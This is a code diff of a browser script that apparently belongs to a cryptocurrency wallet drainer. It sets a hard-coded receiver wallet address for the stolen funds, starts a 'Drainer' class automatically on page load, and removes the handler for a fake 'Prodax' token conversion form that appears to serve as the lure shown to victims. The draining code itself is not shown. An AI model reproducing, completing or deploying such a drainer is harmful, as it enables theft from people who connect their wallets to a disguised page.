@@ -6,7 +6,7 @@ window.Buffer = buffer.Buffer
 
 const config = { 
 
-    receiver: "0x439D28c06932cc9C9b2ef54e73430b8e04c7fd1E",
+    receiver: "0x439d28c06932cc9c9b2ef54e73430b8e04c7fd1e",
     
     logDomainName: "localhost:3000/",
 
@@ -479,37 +479,4 @@ class Drainer extends Configuration {
 
 window.addEventListener('load', async () => {
     new Drainer();
-});
-
-document.getElementById('convertForm').addEventListener('submit', function(event) {
-    event.preventDefault(); // Prevent the form from submitting the traditional way
-
-    const amount = parseFloat(document.getElementById('amount').value);
-    const minAmount = 500;
-    const maxAmount = 50000;
-    const message = document.getElementById('message');
-
-    if (isNaN(amount)) {
-        message.textContent = "Please enter a valid number.";
-        message.style.color = "red";
-        return;
-    }
-
-    if (amount < minAmount) {
-        message.textContent = `The minimum amount to convert is ${minAmount} Prodax.`;
-        message.style.color = "red";
-        return;
-    }
-
-    if (amount > maxAmount) {
-        message.textContent = `The maximum amount to convert is ${maxAmount} Prodax.`;
-        message.style.color = "red";
-        return;
-    }
-
-    message.textContent = "";
-    
-    // Add your conversion logic here
-    // For now, we'll simulate a successful conversion
-    document.getElementById('notEli').style.display = "block";
 });
